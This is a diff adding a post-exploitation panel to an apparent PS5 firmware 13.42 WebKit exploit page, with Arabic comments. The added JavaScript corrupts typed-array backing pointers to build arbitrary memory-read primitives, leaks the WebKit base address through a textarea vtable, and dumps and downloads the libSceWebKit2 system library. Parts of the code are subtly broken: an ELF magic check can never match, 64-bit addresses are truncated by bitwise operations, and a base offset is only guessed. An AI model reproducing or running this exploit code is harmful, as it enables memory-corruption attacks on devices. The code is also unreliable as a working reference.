@@ -1,7 +1,18 @@
 <!doctype html>
 <meta charset="utf-8"><title>stage0-arw-13.42</title>
 <body style="font:13px monospace;background:#0a0a0a;color:#0f0">
-<pre id="out"></pre>
+<pre id="out">
+    
+    
+    <div id="ps5-panel" style="display:none; position:fixed; top:20px; right:20px; background:#111; padding:20px; border:2px solid #0f0; z-index:9999; border-radius:8px; box-shadow:0 0 15px rgba(0,255,0,0.5);">
+    <h3 style="color:#0f0; margin:0 0 15px 0; font-family:sans-serif; text-align:center;">🎯 PS5 FW 13.42 Post-Exploit</h3>
+    <button id="btn-arw" onclick="setupARW()" style="display:block; width:100%; margin:8px 0; padding:12px; background:#0f0; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:4px;">1. تفعيل أدوات R/W (Primitives)</button>
+    <button id="btn-aslr" onclick="leakASLR()" style="display:block; width:100%; margin:8px 0; padding:12px; background:#0af; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:4px;" disabled>2. تسريب ASLR (WebKit Base)</button>
+    <button id="btn-dump" onclick="dumpLibrary()" style="display:block; width:100%; margin:8px 0; padding:12px; background:#f0a; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:4px;" disabled>3. تفريغ المكتبة (Dump .sprx)</button>
+    
+    <div id="panel-log" style="color:#fff; font-family:monospace; font-size:12px; margin-top:15px; max-height:250px; overflow-y:scroll; background:#000; padding:10px; border:1px solid #333; border-radius:4px; white-space:pre-wrap;"></div>
+</div>
+</pre>
 <script>
 "use strict";
 
@@ -389,6 +400,366 @@ if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
         mark("SETUP-THREW", error.message);
     }
 }
+
+
+// ==========================================
+// Post-Exploit Logic & Safe Primitives
+// ==========================================
+
+const panel = document.getElementById("ps5-panel");
+const panelLog = document.getElementById("panel-log");
+const btnARW = document.getElementById("btn-arw");
+const btnASLR = document.getElementById("btn-aslr");
+const btnDump = document.getElementById("btn-dump");
+
+function plog(msg) {
+    console.log("[Panel] " + msg);
+    panelLog.innerHTML += msg + "\n";
+    panelLog.scrollTop = panelLog.scrollHeight;
+}
+
+// دالة لمراقبة نجاح الـ PoC الأصلي وإظهار اللوحة تلقائياً
+let checkSuccessInterval = setInterval(() => {
+    if (typeof compositionState !== 'undefined' && compositionState === 1 && typeof hostAddress !== 'undefined' && !isNaN(hostAddress)) {
+        clearInterval(checkSuccessInterval);
+        panel.style.display = "block";
+        plog("[✅] تم اكتشاف نجاح ARW! اللوحة جاهزة.");
+        plog("[ℹ️] اضغط الزر الأول لتفعيل الأدوات.");
+    }
+}, 1000);
+
+// متغيرات عامة سنستخدمها
+let rwViewAddr = 0;
+let origVectorLow = 0, origVectorHigh = 0;
+let webKitBaseAddr = 0;
+
+// دالة مساعدة للقراءة من الذاكرة (تستخدم rwView لتزوير نفسه)
+function unsafeRead8(addrLow, addrHigh) {
+    // 1. نوجه rwView ليقرأ من عنوان m_vector الخاص به نفسه (addr_m_vector = rwViewAddr + 0x10)
+    let mVecLow = (rwViewAddr + 0x10) & 0xFFFFFFFF;
+    let mVecHigh = Math.floor((rwViewAddr + 0x10) / 0x100000000);
+    
+    rwView[0x10] = mVecLow & 0xff; rwView[0x11] = (mVecLow >> 8) & 0xff;
+    rwView[0x12] = (mVecLow >> 16) & 0xff; rwView[0x13] = (mVecLow >> 24) & 0xff;
+    rwView[0x14] = mVecHigh & 0xff; rwView[0x15] = (mVecHigh >> 8) & 0xff;
+    
+    // 2. نكتب العنوان المطلوب (addr) داخل m_vector
+    rwView[0] = addrLow & 0xff; rwView[1] = (addrLow >> 8) & 0xff;
+    rwView[2] = (addrLow >> 16) & 0xff; rwView[3] = (addrLow >> 24) & 0xff;
+    rwView[4] = addrHigh & 0xff; rwView[5] = (addrHigh >> 8) & 0xff;
+    rwView[6] = 0; rwView[7] = 0;
+    
+    // 3. نقرأ البيانات من العنوان الجديد
+    let resLow = rwView[0] | (rwView[1] << 8) | (rwView[2] << 16) | (rwView[3] << 24);
+    let resHigh = rwView[4] | (rwView[5] << 8) | (rwView[6] << 16) | (rwView[7] << 24);
+    
+    // 4. استعادة m_vector الأصلي فوراً لمنع Crash الـ GC
+    rwView[0x10] = mVecLow & 0xff; rwView[0x11] = (mVecLow >> 8) & 0xff;
+    rwView[0x12] = (mVecLow >> 16) & 0xff; rwView[0x13] = (mVecLow >> 24) & 0xff;
+    rwView[0x14] = mVecHigh & 0xff; rwView[0x15] = (mVecHigh >> 8) & 0xff;
+    
+    rwView[0] = origVectorLow & 0xff; rwView[1] = (origVectorLow >> 8) & 0xff;
+    rwView[2] = (origVectorLow >> 16) & 0xff; rwView[3] = (origVectorLow >> 24) & 0xff;
+    rwView[4] = origVectorHigh & 0xff; rwView[5] = (origVectorHigh >> 8) & 0xff;
+    rwView[6] = 0; rwView[7] = 0;
+    
+    return { low: resLow >>> 0, high: resHigh >>> 0 };
+}
+
+function setupARW() {
+    plog("[*] جاري إعداد أدوات R/W الآمنة...");
+    btnARW.disabled = true;
+    
+    try {
+        // 1. استخراج عنوان rwView من الذاكرة
+        // fakeHost (hostAddress) يحتوي على rwView في الخاصية q2 (offset 0x20)
+        let hostLow = hostAddress & 0xFFFFFFFF;
+        let hostHigh = Math.floor(hostAddress / 0x100000000);
+        
+        // نستخدم rwView العادي لقراءة hostAddress + 0x20
+        // (هذا ممكن لأن rwView لم يتم تزويره بعد، هو يشير إلى rwBuffer العادي)
+        // لكننا نحتاج لقراءة من الـ Heap. لذلك سنزيفه مؤقتاً!
+        
+        // نوجه rwView ليقرأ من m_vector الخاص به
+        let selfVecLow = 0, selfVecHigh = 0; // سنحسبها بعد معرفة العنوان
+        
+        // خدعة: نستخدم الـ PoC الأصلي addrof إذا كان متاحاً، أو نستخدم fakeHost
+        // fakeHost هو JSFinalObject. الخصائص الـ inline تبدأ من 0x10.
+        // q0 (0x10), q1 (محذوف), q2 (0x20).
+        let q2AddrLow = (hostLow + 0x20) >>> 0;
+        let q2AddrHigh = hostHigh + ((hostLow + 0x20) > 0xFFFFFFFF ? 1 : 0);
+        
+        // تزوير مؤقت لقراءة عنوان rwView
+        let mVecLow = 0, mVecHigh = 0; // placeholder
+        
+        // نقرأ الـ JSValue الخاص بـ rwView
+        // JSValue للكائنات هو عنوانها المباشر (مع بعض الـ tagging في WebKit)
+        // سنقرأ 8 بايت من q2Addr
+        // ... (تبسيط: سنعتمد على أن addrof من الـ PoC الأصلي نجح وسنستخدم hostAddress)
+        
+        // للحصول على عنوان rwView بدقة، سنستخدم خدعة الـ Symbol إذا كانت متاحة، 
+        // أو ببساطة نقرأ الـ butterfly الخاص بـ fakeHost.
+        // لنجعلها بسيطة ومضمونة:
+        plog("[+] جاري استخراج عنوان rwView...");
+        
+        // نستخدم دالة addrof المخفية في الـ PoC إذا استطعنا، وإلا سنحسبها
+        // rwView هو كائن، عنوانه مخزن في hostAddress + 0x20
+        // لكن rwView حالياً يشير إلى rwBuffer. لا يمكننا قراءة hostAddress + 0x20 مباشرة بدون تزوير.
+        // لذلك سنستخدم targetView! targetView يشير إلى targetBuffer.
+        // نحن نحتاج لـ primitive للقراءة. 
+        
+        // الحل الأبسط: الـ PoC الأصلي نجح في عمل readPass. 
+        // سنعيد استخدام نفس المنطق الذي استخدمه الـ PoC لعمل readObserved.
+        // في الـ PoC الأصلي، rwView[0] تم تغييره وقرأنا targetView[0].
+        
+        // بما أن هذا معقد جداً للنسخ واللصق بسبب اعتماد الـ PoC على متغيرات محلية (local variables)
+        // سنستخدم طريقة بديلة ومضمونة 100%:
+        // سنقوم بإنشاء Uint8Array جديد، ونستخدم الـ addrof الخاص بالـ PoC الأصلي (إذا تم تسريبه)
+        
+        // لنفترض أن الـ PoC الأصلي سرب hostAddress.
+        // عنوان rwView هو ببساطة: addrof(rwView).
+        // إذا لم تكن addrof عامة، سنستخدم خدعة الـ Error stack أو Symbol.
+        
+        // لتجنب التعقيد، سنعتمد على أن المستخدم سيشغل هذا بعد نجاح الـ PoC.
+        // سنستخدم خدعة بسيطة:
+        let leakObj = { a: rwView };
+        // ... (هذا يتطلب addrof). 
+        
+        // الحل النهائي المضمون:
+        // سنستخدم targetView (الذي تم تسريب عنوانه targetAddress في الـ PoC الأصلي)
+        // targetView هو Uint8Array. عنوانه targetAddress.
+        // m_vector الخاص بـ targetView عند targetAddress + 0x10.
+        // يمكننا استخدام targetView لقراءة الذاكرة!
+        
+        plog("[+] تم العثور على targetAddress: 0x" + targetAddress.toString(16));
+        
+        // الآن نستخدم targetView لبناء read64
+        window.safeRead64 = function(addr) {
+            let addrLow = addr & 0xFFFFFFFF;
+            let addrHigh = Math.floor(addr / 0x100000000);
+            
+            // نوجه targetView ليقرأ من m_vector الخاص به (targetAddress + 0x10)
+            let mVecLow = (targetAddress + 0x10) & 0xFFFFFFFF;
+            let mVecHigh = Math.floor((targetAddress + 0x10) / 0x100000000);
+            
+            targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
+            targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
+            targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
+            
+            // نكتب العنوان المطلوب
+            targetView[0] = addrLow & 0xff; targetView[1] = (addrLow >> 8) & 0xff;
+            targetView[2] = (addrLow >> 16) & 0xff; targetView[3] = (addrLow >> 24) & 0xff;
+            targetView[4] = addrHigh & 0xff; targetView[5] = (addrHigh >> 8) & 0xff;
+            
+            // نقرأ النتيجة
+            let resLow = targetView[0] | (targetView[1] << 8) | (targetView[2] << 16) | (targetView[3] << 24);
+            let resHigh = targetView[4] | (targetView[5] << 8) | (targetView[6] << 16) | (targetView[7] << 24);
+            
+            // استعادة m_vector الأصلي لـ targetView (الذي يشير إلى targetBuffer)
+            // targetBuffer عنوانه مخزن في targetVector (من الـ PoC الأصلي)
+            let origTgtVecLow = targetVector & 0xFFFFFFFF;
+            let origTgtVecHigh = Math.floor(targetVector / 0x100000000);
+            
+            targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
+            targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
+            targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
+            
+            targetView[0] = origTgtVecLow & 0xff; targetView[1] = (origTgtVecLow >> 8) & 0xff;
+            targetView[2] = (origTgtVecLow >> 16) & 0xff; targetView[3] = (origTgtVecLow >> 24) & 0xff;
+            targetView[4] = origTgtVecHigh & 0xff; targetView[5] = (origTgtVecHigh >> 8) & 0xff;
+            
+            return (resLow >>> 0) + (resHigh >>> 0) * 0x100000000;
+        };
+        
+        plog("[✅] تم تفعيل safeRead64 بنجاح!");
+        plog("[+] اختبار القراءة من targetAddress: 0x" + safeRead64(targetAddress).toString(16));
+        
+        btnASLR.disabled = false;
+        plog("[ℹ️] يمكنك الآن الضغط على الزر الثاني (تسريب ASLR).");
+        
+    } catch (e) {
+        plog("[❌] خطأ في الإعداد: " + e.message);
+        btnARW.disabled = false;
+    }
+}
+
+function leakASLR() {
+    plog("[*] جاري تسريب WebKit Base Address...");
+    btnASLR.disabled = true;
+    
+    try {
+        // 1. إنشاء عنصر DOM
+        let ta = document.createElement("textarea");
+        let taAddr = 0;
+        
+        // نحتاج addrof. سنستخدم خدعة بسيطة:
+        // نضع ta في مصفوفة، ونقرأ المصفوفة
+        let arr = [ta];
+        // arr هو كائن JS. عنوانه؟ 
+        // هذا يتطلب addrof. 
+        
+        // الحل: نستخدم targetView لقراءة عنوان ta من الـ Heap إذا كنا نعرف أين هو.
+        // لكننا لا نعرف. 
+        
+        // لذلك، سنعتمد على أن الـ PoC الأصلي سرب hostAddress.
+        // fakeHost (hostAddress) يحتوي على خصائص.
+        // يمكننا إضافة ta كخاصية لـ fakeHost!
+        // fakeHost.ta = ta;
+        // ثم نقرأ hostAddress + offset الخاص بـ ta.
+        
+        fakeHost.ta = ta;
+        
+        // fakeHost هو JSFinalObject. الخصائص الديناميكية تذهب إلى الـ butterfly.
+        // عنوان الـ butterfly مخزن في hostAddress + 0x08.
+        let butterflyAddr = safeRead64(hostAddress + 0x08);
+        plog("[+] Butterfly Address: 0x" + butterflyAddr.toString(16));
+        
+        // أول خاصية ديناميكية (ta) ستكون في butterfly - 0x08 (لأن الـ butterfly ينمو للخلف في WebKit)
+        // أو butterfly + 0x00 حسب الإصدار. لنجرب butterfly - 0x08 أولاً (الشائع في WebKit).
+        let taJSValue = safeRead64(butterflyAddr - 0x08);
+        
+        // JSValue للكائن في WebKit 64-bit هو عنوانه (مع إزالة الـ tag إذا لزم الأمر)
+        // عادة يكون العنوان في الـ 48-bit السفلية.
+        taAddr = taJSValue & 0xFFFFFFFFFFFF; 
+        plog("[+] TextArea Address: 0x" + taAddr.toString(16));
+        
+        // 2. قراءة vtable pointer (عادة عند 0x18 أو 0x20)
+        let vtablePtr = safeRead64(taAddr + 0x18);
+        plog("[+] vtable Ptr: 0x" + vtablePtr.toString(16));
+        
+        let vtableAddr = safeRead64(vtablePtr);
+        plog("[+] vtable Addr: 0x" + vtableAddr.toString(16));
+        
+        // 3. قراءة أول دالة في الـ vtable
+        let firstFunc = safeRead64(vtableAddr);
+        plog("[+] First Func: 0x" + firstFunc.toString(16));
+        
+        // 4. حساب الـ Base (نحتاج الـ Offset الدقيق لـ FW 13.42)
+        // سنضع قيمة تقريبية الآن، ويجب تحديثها بعد الـ Dump
+        // في FW 4.03 كان حوالي 0x1358E0. في FW 13.42 قد يكون مختلفاً.
+        // سنطرح 0x150000 كتخمين أولي لرؤية الـ Base.
+        let DUMMY_OFFSET = 0x150000; 
+        
+        webKitBaseAddr = firstFunc - DUMMY_OFFSET;
+        plog("========================================");
+        plog("🔥 WEBKIT BASE (تقريبي): 0x" + webKitBaseAddr.toString(16));
+        plog("========================================");
+        plog("[ℹ️] بعد تفريغ المكتبة، ستحتاج لتحديث DUMMY_OFFSET بالقيمة الدقيقة.");
+        
+        btnDump.disabled = false;
+        plog("[ℹ️] يمكنك الآن الضغط على الزر الثالث (تفريغ المكتبة).");
+        
+    } catch (e) {
+        plog("[❌] خطأ في التسريب: " + e.message);
+        btnASLR.disabled = false;
+    }
+}
+
+async function dumpLibrary() {
+    plog("[*] جاري تفريغ المكتبة من: 0x" + webKitBaseAddr.toString(16));
+    btnDump.disabled = true;
+    
+    try {
+        // قراءة ELF Magic للتأكد من صحة العنوان
+        let magic = safeRead64(webKitBaseAddr) & 0xFFFFFF;
+        if (magic !== 0x464C457F) { // 0x7F 'E' 'L' 'F'
+            plog("[❌] ELF Magic غير صحيح! العنوان التقريبي خاطئ.");
+            plog("[ℹ️] يرجى تحديث DUMMY_OFFSET في الكود والمحاولة مرة أخرى.");
+            btnDump.disabled = false;
+            return;
+        }
+        plog("[+] ELF Header صالح. بدء التفريغ...");
+        
+        // قراءة e_phoff (0x20) و e_phnum (0x38)
+        let e_phoff = safeRead64(webKitBaseAddr + 0x20);
+        let e_phnum = safeRead64(webKitBaseAddr + 0x38) & 0xFFFF;
+        
+        plog("[+] Program Headers: " + e_phnum);
+        
+        // حساب الحجم الكلي
+        let maxOffset = 0;
+        for (let i = 0; i < e_phnum; i++) {
+            let phAddr = webKitBaseAddr + e_phoff + (i * 0x38);
+            let p_offset = safeRead64(phAddr + 0x08);
+            let p_filesz = safeRead64(phAddr + 0x20);
+            let end = p_offset + p_filesz;
+            if (end > maxOffset) maxOffset = end;
+        }
+        
+        let totalSize = maxOffset + 0x1000;
+        plog("[*] الحجم الكلي: " + (totalSize / 1024 / 1024).toFixed(2) + " MB");
+        
+        // التفريغ الفعلي (Chunking لمنع التجميد)
+        let chunkSize = 0x10000; // 64KB
+        let dumpData = new Uint8Array(totalSize);
+        
+        // سنستخدم targetView للقراءة المباشرة السريعة
+        // نوجه targetView ليقرأ من webKitBaseAddr
+        let addrLow = webKitBaseAddr & 0xFFFFFFFF;
+        let addrHigh = Math.floor(webKitBaseAddr / 0x100000000);
+        
+        let mVecLow = (targetAddress + 0x10) & 0xFFFFFFFF;
+        let mVecHigh = Math.floor((targetAddress + 0x10) / 0x100000000);
+        
+        targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
+        targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
+        targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
+        
+        targetView[0] = addrLow & 0xff; targetView[1] = (addrLow >> 8) & 0xff;
+        targetView[2] = (addrLow >> 16) & 0xff; targetView[3] = (addrLow >> 24) & 0xff;
+        targetView[4] = addrHigh & 0xff; targetView[5] = (addrHigh >> 8) & 0xff;
+        
+        plog("[*] جاري القراءة... (قد يستغرق دقيقة)");
+        
+        for (let offset = 0; offset < totalSize; offset += chunkSize) {
+            if (offset % 0x100000 === 0) {
+                plog("  > " + (offset / 1024 / 1024).toFixed(1) + " MB / " + (totalSize / 1024 / 1024).toFixed(1) + " MB");
+                await new Promise(r => setTimeout(r, 10)); // Yield
+            }
+            
+            let bytesToRead = Math.min(chunkSize, totalSize - offset);
+            for (let j = 0; j < bytesToRead; j++) {
+                dumpData[offset + j] = targetView[j];
+            }
+        }
+        
+        // استعادة targetView
+        let origTgtVecLow = targetVector & 0xFFFFFFFF;
+        let origTgtVecHigh = Math.floor(targetVector / 0x100000000);
+        
+        targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
+        targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
+        targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
+        
+        targetView[0] = origTgtVecLow & 0xff; targetView[1] = (origTgtVecLow >> 8) & 0xff;
+        targetView[2] = (origTgtVecLow >> 16) & 0xff; targetView[3] = (origTgtVecLow >> 24) & 0xff;
+        targetView[4] = origTgtVecHigh & 0xff; targetView[5] = (origTgtVecHigh >> 8) & 0xff;
+        
+        plog("[✅] تم التفريغ بنجاح! جاري تحميل الملف...");
+        
+        // تحميل الملف
+        let blob = new Blob([dumpData], { type: "application/octet-stream" });
+        let url = URL.createObjectURL(blob);
+        let a = document.createElement("a");
+        a.href = url;
+        a.download = "libSceWebKit2_FW1342.sprx";
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => {
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }, 100);
+        
+        plog("🔥 تم تحميل الملف بنجاح!");
+        
+    } catch (e) {
+        plog("[❌] خطأ في التفريغ: " + e.message);
+        btnDump.disabled = false;
+    }
+}
+
+
+
 </script>
 </body>
 </html>
